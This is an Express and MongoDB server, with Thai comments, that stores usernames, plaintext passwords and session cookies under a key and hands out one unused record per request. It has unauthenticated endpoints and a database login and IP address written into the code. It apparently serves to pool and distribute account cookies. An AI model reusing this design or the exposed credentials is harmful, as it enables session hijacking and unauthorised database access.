const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');

const app = express();
const port = 3000;

// Middleware for parsing request body
app.use(bodyParser.json());

// เชื่อมต่อ MongoDB
mongoose.connect('mongodb://clm7cqub1001qbsmn1nj4ctpv:lFTpO2CZrft9yz3bNGYduxc9@161.246.127.24:9042/?readPreference=primary&ssl=false');

// สร้าง Schema สำหรับข้อมูล key
const cookieSchema = new mongoose.Schema({
    key: String,
    user: String,
    password: String,
    cookie: String,
    status: { type: Number, default: 0 }
});

// สร้างโมเดล (Model) จาก Schema
const Cookie = mongoose.model('Cookie', cookieSchema);

// POST /key - เพิ่มข้อมูลใหม่
app.post('/key', async (req, res) => {
    try {
        const { key, user, password, cookie } = req.body;
        
        if (!key || !cookie) {
            return res.status(400).send('Key and cookie are required');
        }

        const same = await Cookie.findOne({ key, cookie });

        if (same) {
            return res.status(404).send("same cookie");
        }

        const newCookie = new Cookie({ key, user, password, cookie, status: 0 });
        await newCookie.save();
        
        res.status(201).send(newCookie);
    } catch (error) {
        res.status(500).send(error.message);
    }
});

// GET /key - รับข้อมูลตาม key ที่ระบุ
app.post('/make', async (req, res) => {
    try {
        const { key } = req.body;

        if (!key) {
            return res.status(400).send('Key is required');
        }

        const foundCookie = await Cookie.findOne({ key, status:0 });
        
        if (!foundCookie) {
            return res.status(404).send('Key not found');
        }

        const updatedCookie = await Cookie.findOneAndUpdate(
            { _id: foundCookie._id },
            { status: 1 },
            { new: true }
        );

        if (!updatedCookie) {
            return res.status(404).send('Key not found updatedCookie');
        }

        res.status(200).send(foundCookie);
    } catch (error) {
        res.status(500).send(error.message);
    }
});

app.get('/', async (req, res) => {
    try {
        const newCookie = await Cookie.find({ key:"abc123", status: 0 });
        console.log(newCookie.length);
        return res.send("Cookie : "+newCookie.length);
    } catch (error) {
        res.status(500).send(error.message);
    }
});

// เริ่มเซิร์ฟเวอร์
app.listen(port, () => {
    console.log(`Server is running on http://localhost:${port}`);
});
